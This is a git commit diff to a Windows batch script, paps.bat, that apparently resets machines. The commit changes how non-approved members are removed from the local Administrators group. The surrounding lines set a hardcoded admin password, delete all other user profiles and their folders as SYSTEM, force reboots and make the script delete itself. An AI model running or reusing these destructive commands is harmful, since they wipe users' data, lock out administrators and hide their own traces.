7484d50ccd7fb49bcc11a9fd575a16b121302252
shansnow89 <norshanlee89@gmail.com>
2026-06-22 12:05:59 +0800

    Update paps.bat

--- paps.bat
+++ paps.bat
@@ -13,7 +13,7 @@ echo @echo off
 echo reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v RegisteredOwner /f
 echo reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v RegisteredOrganization /f
 echo net user @dm1n "IBEX@dm1n!" ^>nul 2^>^&1
-echo powershell -c "Start-Process cmd -Verb RunAs -ArgumentList '/c for /f \"skip=4 tokens=1-3 delims= \" %%a in (''net localgroup Administrators'') do @if /i not \"%%a\"==\"Administrator\" if /i not \"%%a\"==\"@dm1n\" if /i not \"%%a\"==\"%%COMPUTERNAME%%\\@dm1n\" net localgroup Administrators %%a /delete >nul 2>&1'"
+echo powershell -c "Get-LocalGroupMember -Group 'Administrators' ^| Where-Object { $_.Name -notlike '*@dm1n*' -and $_.Name -notlike '*Administrator*' } ^| Remove-LocalGroupMember -Group 'Administrators' -ErrorAction SilentlyContinue"
 echo psexec -accepteula -s -i powershell -Command "$exclude=@('Public','Default','@dm1n'); Get-ChildItem 'C:\Users' -Directory | Where-Object {$exclude -notcontains $_.Name} | ForEach-Object {$p=$_.FullName; (Get-WmiObject Win32_UserProfile | Where-Object {$_.LocalPath -eq $p}) | ForEach-Object {$_.Delete()}; Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue}; attrib +h 'C:\Users\Public' 2>$null; tzutil /s 'Singapore Standard Time'; shutdown -r -t 5; Start-Sleep -Seconds 3; Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue"
 echo del "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\user.bat" /f /q ^>nul 2^>^&1
 echo shutdown -r -t 20 ^>nul 2^>^&1
